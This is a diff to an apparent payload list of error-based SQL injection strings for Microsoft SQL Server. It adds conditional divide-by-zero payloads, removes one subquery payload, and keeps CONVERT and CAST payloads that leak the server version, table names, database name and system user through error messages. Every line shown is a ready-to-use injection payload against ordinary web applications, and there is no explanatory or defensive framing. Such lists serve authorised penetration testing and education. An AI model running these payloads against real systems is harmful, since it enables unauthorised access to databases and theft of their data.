@@ -1,5 +1,9 @@
 # MSSQL — Error-Based Payloads
 
+# --- Conditional errors (PortSwigger) ---
+' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--
+' AND 1=(SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END)--
+
 # --- CONVERT errors (most reliable) ---
 ' AND 1=CONVERT(int,@@version)--
 ' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
@@ -12,6 +16,3 @@
 ' AND 1=CAST(@@version AS int)--
 ' AND 1=CAST(db_name() AS int)--
 ' AND 1=CAST(system_user AS int)--
-
-# --- Error via subquery ---
-' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects WHERE xtype='U')--
